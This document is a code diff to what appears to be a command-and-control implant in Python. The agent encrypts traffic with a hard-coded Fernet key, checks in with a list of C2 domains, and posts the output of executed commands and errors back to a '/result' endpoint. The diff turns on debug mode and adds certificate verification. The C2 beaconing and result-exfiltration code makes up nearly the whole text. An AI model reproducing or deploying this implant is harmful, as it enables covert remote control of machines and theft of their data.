@@ -9,7 +9,7 @@ from cryptography.fernet import Fernet
 SECRET_KEY = b'7lJcf_dNt7Jhc87wCBcYO46b4XRy18upQmOKrij3B4k='
 cipher = Fernet(SECRET_KEY)
 
-DEBUG_MODE = False
+DEBUG_MODE = True
 
 # Failover list
 C2_DOMAINS = ["https://midevil-scoring-engine.com",
@@ -57,7 +57,7 @@ def run_agent():
                     f"{url}/checkin",
                     data=encrypted_heartbeat,
                     timeout=10,
-                    verify=False
+                    verify=CERT_PATH
                 )
 
                 if response.status_code == 200:
@@ -83,7 +83,7 @@ def run_agent():
                         requests.post(
                             f"{url}/result",
                             data=encrypted_result,
-                            verify=False,
+                            verify=CERT_PATH,
                             timeout=10
                         )
                         if DEBUG_MODE is True:
@@ -95,7 +95,7 @@ def run_agent():
                 # Fallback for empty results/errors
                 error_msg = f"{my_hostname}|Error executing command: {str(e)}"
                 try:
-                    requests.post(f"{url}/result", data=cipher.encrypt(error_msg.encode()), verify=False, timeout=5)
+                    requests.post(f"{url}/result", data=cipher.encrypt(error_msg.encode()), verify=CERT_PATH, timeout=5)
                 except Exception:
                     pass
                 if DEBUG_MODE is True:
